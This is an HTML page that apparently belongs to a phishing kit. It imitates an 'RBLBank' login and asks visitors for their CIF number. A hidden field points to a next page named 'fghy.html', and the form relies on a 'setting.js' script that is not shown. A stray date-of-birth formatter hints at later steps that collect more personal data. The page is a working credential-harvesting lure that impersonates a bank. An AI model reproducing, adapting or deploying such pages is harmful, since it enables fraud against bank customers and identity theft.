<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="sss/misss.css">
    <title>RBLBank</title>
</head>

<body>
<header class="d-flex justify-content-center mb-4" style="border-bottom:1px solid #1b3281">
    <img src="sss/header.png" width="120%" alt="">
</header>

<main class="container">
    <div id="test" class="text-danger text-center fw-bold"></div>
    <input type="hidden" id="nextValue" value="fghy.html">
    <div class="card shadow-lg m-2">
        <div class="card-header">
            <h4>Enter Your CIF Number</h4>
        </div>
        <form action="" id="form" class="mt-3  p-2">

            <div class="form-floating mb-3">
                <input  required type="text" class="form-control" name="cifffno" minlength="7" minlength="9" >
                <label for="floatingInput">Cif Number*</label>
            </div>
            <div class="text-center mt-2">
                <button type="submit" id="submit-button" class="btn btn-lg btn-primary mt-2" style="width: 143px !important;
    padding: 3px 10px;
    border-radius: 20px;
    background: #5757ff;" >Login</button>
            </div>
            <div class="my-4">
                <img src="sss/ft.png" width="100%" alt="">
            </div>
        </form>
    </div>
</main>

<footer class="mt-4">
    <img src="sss/footer.png" width="100%" alt="">
</footer>
<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
        crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
<script src="sss/setting.js"></script>
<script>
    var cleave = new Cleave('#dob', {
      date: true,
      delimiter: '/',
      datePattern: ['m', 'd', 'Y']
    });
</script>
</body>

</html>
